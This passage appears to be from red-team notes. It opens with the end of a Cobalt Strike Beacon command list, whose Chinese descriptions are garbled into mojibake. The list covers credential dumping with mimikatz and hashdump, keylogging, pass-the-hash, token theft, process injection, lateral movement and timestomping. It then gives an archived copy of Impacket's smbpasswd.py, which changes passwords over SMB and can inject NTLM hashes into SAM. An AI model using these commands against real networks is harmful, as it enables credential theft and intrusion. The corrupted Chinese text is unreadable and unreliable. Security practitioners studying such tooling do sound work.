hashdump		è·å–æœ¬åœ°ç”¨æˆ·hash
history			æ˜¾ç¤ºå†å²å‘½ä»¤è®°å½•
help			å¸®åŠ©ä¿¡æ¯
inject			åœ¨æŒ‡å®šè¿›ç¨‹ä¸­æ³¨å…¥æ–°çš„Beaconä¼šè¯
inline-execute		åœ¨å½“å‰ä¼šè¯ä¸­æ‰§è¡ŒBeacon Object File
jobs			åˆ—å‡ºæ‰€æœ‰åå°ä»»åŠ¡
jobkill			ç»“æŸä¸€ä¸ªåå°ä»»åŠ¡
jump			åœ¨è¿œç¨‹æœºå™¨ä¸Šæ¤å…¥Beaconï¼ˆæ¨ªå‘ç§»åŠ¨ï¼‰
kerberos_ccache_use		ä»ccacheæ–‡ä»¶å¯¼å…¥kerberosç¥¨æ®åˆ°å½“å‰ä¼šè¯ä¸­
kerberos_ticket_purge	æ¸…ç©ºå½“å‰ä¼šè¯ä¸­çš„æ‰€æœ‰kerberosç¥¨æ®
kerberos_ticket_use		ä»ticketæ–‡ä»¶ä¸­å¯¼å…¥kerberosç¥¨æ®åˆ°å½“å‰ä¼šè¯ä¸­
keylogger		å¼€å¯é”®ç›˜è®°å½•
kill			ç»“æŸæŒ‡å®šè¿›ç¨‹
link			é€šè¿‡å‘½åç®¡é“æ­£å‘è¿æ¥è¿œç¨‹Beacon
logonpasswords		ä½¿ç”¨mimikatzè·å–å¯†ç å’Œhash
ls			åˆ—å‡ºç›®å½•æ–‡ä»¶
make_token		åˆ›å»ºè¿›ç¨‹è®¿é—®ä»¤ç‰Œï¼ˆaccess tokenï¼‰ï¼Œä»…ç”¨äºè®¿é—®ç½‘ç»œèµ„æº
mimikatz		è¿è¡Œmimikatz
mkdir			åˆ›å»ºç›®å½•
mode dns		ä½¿ç”¨DNS Aè®°å½•ä½œä¸ºæ•°æ®é€šé“ï¼ˆä»…æ”¯æŒDNSä¸Šçº¿Beaconï¼‰
mode dns6		ä½¿ç”¨DNS AAAAè®°å½•ä½œä¸ºæ•°æ®é€šé“ï¼ˆä»…æ”¯æŒDNSä¸Šçº¿Beaconï¼‰
mode dns-txt		ä½¿ç”¨DNS TXTè®°å½•ä½œä¸ºæ•°æ®é€šé“ï¼ˆä»…æ”¯æŒDNSä¸Šçº¿Beaconï¼‰
mv			ç§»åŠ¨æ–‡ä»¶
net			ç½‘ç»œå’Œä¸»æœºæ¢æµ‹å·¥å…·ï¼ˆå†…ç½®netå‘½ä»¤ï¼‰
note			ç»™å½“å‰ä¼šè¯æ·»åŠ å¤‡æ³¨ä¿¡æ¯
portscan		ç½‘ç»œç«¯å£æ‰«æ
powerpick		å†…å­˜æ‰§è¡ŒPowershellå‘½ä»¤ï¼ˆä¸è°ƒç”¨powershell.exeï¼‰
powershell		é€šè¿‡powershell.exeæ‰§è¡ŒPowershellå‘½ä»¤
powershell-import	å¯¼å…¥æœ¬åœ°powershellè„šæœ¬åˆ°å½“å‰ä¼šè¯ä¸­
ppid			ä¸ºæ‰€æœ‰æ–°è¿è¡Œçš„è¿›ç¨‹è®¾ç½®ä¼ªé€ çš„çˆ¶è¿›ç¨‹PID
printscreen		ä½¿ç”¨PrintScræ–¹å¼æˆªå±
ps			æ˜¾ç¤ºè¿›ç¨‹åˆ—è¡¨
psinject		æ³¨å…¥åˆ°æŒ‡å®šè¿›ç¨‹ååœ¨å†…å­˜ä¸­æ‰§è¡ŒPowershellå‘½ä»¤ï¼ˆä¸è°ƒç”¨powershell.exe)
pth			ä½¿ç”¨Mimikatzæ‰§è¡ŒPass-the-hash
pwd			æ˜¾ç¤ºå½“å‰ç›®å½•
reg			æŸ¥è¯¢æ³¨å†Œè¡¨
remote-exec		åœ¨è¿œç¨‹æœºå™¨ä¸Šæ‰§è¡Œå‘½ä»¤ï¼ˆæ¨ªå‘ç§»åŠ¨ï¼‰
rev2self		æ¢å¤åŸå§‹è¿›ç¨‹è®¿é—®ä»¤ç‰Œï¼ˆaccess tokenï¼‰
rm			åˆ é™¤æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹
rportfwd		åå‘ç«¯å£è½¬å‘ï¼ˆä»Cobalt Strike Teamserverå‘èµ·è¿æ¥ï¼‰
rportfwd_local		åå‘ç«¯å£è½¬å‘ï¼ˆä»Cobalt Strikeå®¢æˆ·ç«¯å‘èµ·è¿æ¥ï¼‰
run			åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œç¨‹åºï¼ˆæœ‰å›æ˜¾ï¼‰
runas			ä»¥å¦ä¸€ä¸ªç”¨æˆ·èº«ä»½æ‰§è¡Œç¨‹åº
runasadmin		ä»¥é«˜æƒé™æ‰§è¡Œç¨‹åº
runu			ä»¥å¦ä¸€ä¸ªè¿›ç¨‹PIDä½œä¸ºçˆ¶è¿›ç¨‹PIDï¼Œå¹¶ä»¥å…¶ç”¨æˆ·èº«ä»½æ‰§è¡Œç¨‹åº
screenshot		æˆªå±
screenwatch		å±å¹•ç›‘æ§ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´æˆªå±
setenv			è®¾ç½®ç¯å¢ƒå˜é‡
shell			ä½¿ç”¨cmd.exeæ‰§è¡Œå‘½ä»¤
shinject		æ³¨å…¥shellcodeåˆ°æŒ‡å®šè¿›ç¨‹ä¸­
shspawn			åˆ›å»ºå‚€å„¡è¿›ç¨‹å¹¶æ³¨å…¥shellcodeåˆ°å…¶ä¸­è¿è¡Œ
sleep			è®¾ç½®beaconå›è¿é—´éš”æ—¶é—´
socks			å¯åŠ¨SOCKS4aä»£ç†æœåŠ¡å™¨
socks stop		åœæ­¢SOCKS4aä»£ç†æœåŠ¡å™¨
spawn			åˆ›å»ºä¸€ä¸ªæ–°Beaconä¼šè¯
spawnas			ä»¥å¦ä¸€ä¸ªç”¨æˆ·èº«ä»½åˆ›å»ºä¸€ä¸ªæ–°Beaconä¼šè¯
spawnto			è®¾ç½®åˆ›å»ºæ–°è¿›ç¨‹æ—¶ä½¿ç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼ˆå‚€å„¡è¿›ç¨‹çš„å®¿ä¸»exeæ–‡ä»¶è·¯å¾„ï¼‰
spawnu			ä»¥å¦ä¸€ä¸ªè¿›ç¨‹PIDä½œä¸ºçˆ¶è¿›ç¨‹PIDï¼Œå¹¶ä»¥å…¶ç”¨æˆ·èº«ä»½åˆ›å»ºä¸€ä¸ªæ–°Beaconä¼šè¯
spunnel			è¿è¡Œç¬¬ä¸‰æ–¹agent shellcodeå¹¶å°†å…¶åå‘ä»£ç†åˆ°æ§åˆ¶ç«¯ï¼ˆä»Cobalt Strike Teamserverå‘èµ·è¿æ¥ï¼‰
spunnel_local		è¿è¡Œç¬¬ä¸‰æ–¹agent shellcodeå¹¶å°†å…¶åå‘ä»£ç†åˆ°æ§åˆ¶ç«¯ï¼ˆä»Cobalt Strikeå®¢æˆ·ç«¯å‘èµ·è¿æ¥ï¼‰
ssh			é€šè¿‡SSHè¿æ¥è¿œç¨‹ä¸»æœºï¼ˆä½¿ç”¨è´¦å·å¯†ç è®¤è¯ï¼‰
ssh-key			é€šè¿‡SSHè¿æ¥è¿œç¨‹ä¸»æœºï¼ˆä½¿ç”¨è¯ä¹¦ç§é’¥è®¤è¯ï¼‰
steal_token		ä»æŒ‡å®šè¿›ç¨‹ä¸­çªƒå–è®¿é—®ä»¤ç‰Œï¼ˆaccess token)
timestomp		å¤åˆ¶Bæ–‡ä»¶çš„åˆ›å»ºã€è®¿é—®ã€ä¿®æ”¹æ—¶é—´æˆ³åˆ°Aæ–‡ä»¶ï¼ˆæ–‡ä»¶æ—¶é—´æˆ³ä¼ªé€ ï¼‰
unlink			æ–­å¼€ä¸beaconçš„è¿æ¥ï¼ˆç”¨äºé€šè¿‡TCPã€å‘½åç®¡é“è¿æ¥çš„beaconï¼‰
upload			ä¸Šä¼ æ–‡ä»¶
!			è¿è¡Œå†å²å‘½ä»¤
```



### smbpasswd.py å­˜æ¡£
[https://lira.epac.to/DOCS/python3-impacket/examples/smbpasswd.py](https://lira.epac.to/DOCS/python3-impacket/examples/smbpasswd.py)

```python
#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#  	This script is an alternative to smbpasswd tool and intended to be used
#  	for changing passwords remotely over SMB (MSRPC-SAMR). It can perform the
#  	password change when the current password is expired, and supports NTLM
#  	hashes as a new password value instead of a plaintext value. As for the
#  	latter approach the new password is flagged as expired after the change
#  	due to how SamrChangePasswordUser function works.
#
# 	Examples:
#  		smbpasswd.py j.doe@192.168.1.11
#  		smbpasswd.py contoso.local/j.doe@DC1 -hashes :fc525c9683e8fe067095ba2ddc971889
#  		smbpasswd.py contoso.local/j.doe:'Passw0rd!'@DC1 -newpass 'N3wPassw0rd!'
#  		smbpasswd.py contoso.local/j.doe:'Passw0rd!'@DC1 -newhashes :126502da14a98b58f2c319b81b3a49cb
#  		smbpasswd.py contoso.local/j.doe:'Passw0rd!'@DC1 -newpass 'N3wPassw0rd!' -altuser administrator -altpass 'Adm1nPassw0rd!'
#  		smbpasswd.py contoso.local/j.doe:'Passw0rd!'@DC1 -newhashes :126502da14a98b58f2c319b81b3a49cb -altuser CONTOSO/administrator -altpass 'Adm1nPassw0rd!' -admin
#  		smbpasswd.py SRV01/administrator:'Passw0rd!'@10.10.13.37 -newhashes :126502da14a98b58f2c319b81b3a49cb -altuser CONTOSO/SrvAdm -althash 6fe945ead39a7a6a2091001d98a913ab
#
# Author:
#  	@snovvcrash
#  	@bransh
#  	@alefburzmali
#
# References:
#  	https://snovvcrash.github.io/2020/10/31/pretending-to-be-smbpasswd-with-impacket.html
#  	https://www.n00py.io/2021/09/resetting-expired-passwords-remotely/
#  	https://github.com/samba-team/samba/blob/master/source3/utils/smbpasswd.c
#  	https://github.com/SecureAuthCorp/impacket/pull/381
#  	https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/acb3204a-da8b-478e-9139-1ea589edb880
#  	https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476
#  	https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/538222f7-1b89-4811-949a-0eac62e38dce
#

import sys
import logging
from getpass import getpass
from argparse import ArgumentParser

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.dcerpc.v5 import transport, samr


class SMBPasswd:

	def __init__(self, address, domain='', username='', oldPassword='', newPassword='', oldPwdHashLM='', oldPwdHashNT='', newPwdHashLM='', newPwdHashNT=''):
		self.address = address
		self.domain = domain
		self.username = username
		self.oldPassword = oldPassword
		self.newPassword = newPassword
		self.oldPwdHashLM = oldPwdHashLM
		self.oldPwdHashNT = oldPwdHashNT
		self.newPwdHashLM = newPwdHashLM
		self.newPwdHashNT = newPwdHashNT
		self.dce = None

	def connect(self, domain='', username='', password='', nthash='', anonymous=False):
		rpctransport = transport.SMBTransport(self.address, filename=r'\samr')
		if anonymous:
			rpctransport.set_credentials(username='', password='', domain='', lmhash='', nthash='', aesKey='')
		elif username != '':
			lmhash = ''
			rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey='')
		else:
			rpctransport.set_credentials(self.username, self.oldPassword, self.domain, self.oldPwdHashLM, self.oldPwdHashNT, aesKey='')

		self.dce = rpctransport.get_dce_rpc()
		self.dce.connect()
		self.dce.bind(samr.MSRPC_UUID_SAMR)

	def hSamrUnicodeChangePasswordUser2(self):
		try:
			resp = samr.hSamrUnicodeChangePasswordUser2(self.dce, '\x00', self.username, self.oldPassword, self.newPassword, self.oldPwdHashLM, self.oldPwdHashNT)
		except Exception as e:
			if 'STATUS_PASSWORD_RESTRICTION' in str(e):
				logging.critical('Some password update rule has been violated. For example, the password may not meet length criteria.')
			else:
				raise e
		else:
			if resp['ErrorCode'] == 0:
				logging.info('Password was changed successfully.')
			else:
				logging.error('Non-zero return code, something weird happened.')
				resp.dump()

	def hSamrChangePasswordUser(self):
		try:
			serverHandle = samr.hSamrConnect(self.dce, self.address + '\x00')['ServerHandle']
			domainSID = samr.hSamrLookupDomainInSamServer(self.dce, serverHandle, self.domain)['DomainId']
			domainHandle = samr.hSamrOpenDomain(self.dce, serverHandle, domainId=domainSID)['DomainHandle']
			userRID = samr.hSamrLookupNamesInDomain(self.dce, domainHandle, (self.username,))['RelativeIds']['Element'][0]
			userHandle = samr.hSamrOpenUser(self.dce, domainHandle, userId=userRID)['UserHandle']
		except Exception as e:
			if 'STATUS_NO_SUCH_DOMAIN' in str(e):
				logging.critical('Wrong realm. Try to set the domain name for the target user account explicitly in format DOMAIN/username.')
				return
			else:
				raise e

		try:
			resp = samr.hSamrChangePasswordUser(self.dce, userHandle, self.oldPassword, newPassword='', oldPwdHashNT=self.oldPwdHashNT,
                                                newPwdHashLM=self.newPwdHashLM, newPwdHashNT=self.newPwdHashNT)
		except Exception as e:
			if 'STATUS_PASSWORD_RESTRICTION' in str(e):
				logging.critical('Some password update rule has been violated. For example, the password history policy may prohibit the use of recent passwords.')
			else:
				raise e
		else:
			if resp['ErrorCode'] == 0:
				logging.info('NTLM hashes were changed successfully.')
			else:
				logging.error('Non-zero return code, something weird happened.')
				resp.dump()

	def hSamrSetInformationUser(self):
		try:
			serverHandle = samr.hSamrConnect(self.dce, self.address + '\x00')['ServerHandle']
			domainSID = samr.hSamrLookupDomainInSamServer(self.dce, serverHandle, self.domain)['DomainId']
			domainHandle = samr.hSamrOpenDomain(self.dce, serverHandle, domainId=domainSID)['DomainHandle']
			userRID = samr.hSamrLookupNamesInDomain(self.dce, domainHandle, (self.username,))['RelativeIds']['Element'][0]
			userHandle = samr.hSamrOpenUser(self.dce, domainHandle, userId=userRID)['UserHandle']
		except Exception as e:
			if 'STATUS_NO_SUCH_DOMAIN' in str(e):
				logging.critical('Wrong realm. Try to set the domain name for the target user account explicitly in format DOMAIN/username.')
				return
			else:
				raise e
		try:
			resp = samr.hSamrSetNTInternal1(self.dce, userHandle, self.newPassword, self.newPwdHashNT)
		except Exception as e:
			raise e
		else:
			if resp['ErrorCode'] == 0:
				logging.info('Credentials were injected into SAM successfully.')
			else:
				logging.error('Non-zero return code, something weird happened.')
				resp.dump()


def init_logger(options):
	logger.init(options.ts)
	if options.debug is True:
		logging.getLogger().setLevel(logging.DEBUG)
		logging.debug(version.getInstallationPath())
	else:
		logging.getLogger().setLevel(logging.INFO)


def parse_args():
	parser = ArgumentParser(description='Change password over SMB.')

	parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
	parser.add_argument('-ts', action='store_true', help='adds timestamp to every logging output')
	parser.add_argument('-debug', action='store_true', help='turn DEBUG output ON')

	group = parser.add_mutually_exclusive_group()
	group.add_argument('-newpass', action='store', default=None, help='new SMB password')
	group.add_argument('-newhashes', action='store', default=None, metavar='LMHASH:NTHASH', help='new NTLM hashes, format is LMHASH:NTHASH '
                                                                           '(the user will be asked to change their password at next logon)')

	group = parser.add_argument_group('authentication')
	group.add_argument('-hashes', action='store', default=None, metavar='LMHASH:NTHASH', help='NTLM hashes, format is LMHASH:NTHASH')

	group = parser.add_argument_group('RPC authentication')
	group.add_argument('-altuser', action='store', default=None, help='alternative username')
	group.add_argument('-altpass', action='store', default=None, help='alternative password')
	group.add_argument('-althash', action='store', default=None, help='alternative NT hash')

	group = parser.add_argument_group('set credentials method')
	group.add_argument('-admin', action='store_true', help='injects credentials into SAM (requires admin\'s priveleges on a machine, '
		               'but can bypass password history policy)')

	return parser.parse_args()


if __name__ == '__main__':
	print(version.BANNER)

	options = parse_args()
	init_logger(options)

	domain, username, oldPassword, address = parse_target(options.target)

	if domain is None:
		domain = 'Builtin'

	if options.hashes is not None:
		try:
			oldPwdHashLM, oldPwdHashNT = options.hashes.split(':')
		except ValueError:
			logging.critical('Wrong hashes string format. For more information run with --help option.')
			sys.exit(1)
	else:
		oldPwdHashLM = ''
		oldPwdHashNT = ''

	if oldPassword == '' and oldPwdHashNT == '' and not options.admin:
		oldPassword = getpass('Current SMB password: ')

	if options.newhashes is not None:
		try:
			newPwdHashLM, newPwdHashNT = options.newhashes.split(':')
		except ValueError:
			logging.critical('Wrong new hashes string format. For more information run with --help option.')
			sys.exit(1)
		newPassword = ''
	else:
		newPwdHashLM = ''
		newPwdHashNT = ''
		if options.newpass is None:
			newPassword = getpass('New SMB password: ')
			if newPassword != getpass('Retype new SMB password: '):
				logging.critical('Passwords do not match, try again.')
				sys.exit(1)
		else:
			newPassword = options.newpass

	smbpasswd = SMBPasswd(address, domain, username, oldPassword, newPassword, oldPwdHashLM, oldPwdHashNT, newPwdHashLM, newPwdHashNT)

	if options.altuser is not None:
		try:
			altDomain, altUsername = options.altuser.split('/')
		except ValueError:
			altDomain = domain
			altUsername = options.altuser

		if options.altpass is not None and options.althash is None:
			altPassword = options.altpass
			altNTHash = ''
		elif options.altpass is None and options.althash is not None:
			altPassword = ''
			altNTHash = options.althash
		elif options.altpass is None and options.althash is None:
			logging.critical('Please, provide either alternative password or NT hash for RPC authentication.')
			sys.exit(1)
		else:  # if options.altpass is not None and options.althash is not None
			logging.critical('Argument -altpass not allowed with argument -althash.')
			sys.exit(1)
	else:
		altUsername = ''

	try:
		if altUsername == '':
			smbpasswd.connect()
		else:
			logging.debug('Using {}\\{} credentials to connect to RPC.'.format(altDomain, altUsername))
			smbpasswd.connect(altDomain, altUsername, altPassword, altNTHash)
	except Exception as e:
		if any(msg in str(e) for msg in ['STATUS_PASSWORD_MUST_CHANGE', 'STATUS_PASSWORD_EXPIRED']):
			if newPassword:
				logging.warning('Password is expired, trying to bind with a null session.')
				smbpasswd.connect(anonymous=True)
			else:
				logging.critical('Cannot set new NTLM hashes when current password is expired. Provide a plaintext value for the new password.')
				sys.exit(1)
		elif 'STATUS_LOGON_FAILURE' in str(e):
			logging.critical('Authentication failure.')
			sys.exit(1)
		else:
			raise e

	if options.admin:
		# Inject credentials into SAM (requires admin's privileges)
		smbpasswd.hSamrSetInformationUser()
	else:
		if newPassword:
			# If using a plaintext value for the new password
			smbpasswd.hSamrUnicodeChangePasswordUser2()
		else:
			# If using NTLM hashes for the new password
			smbpasswd.hSamrChangePasswordUser()
```

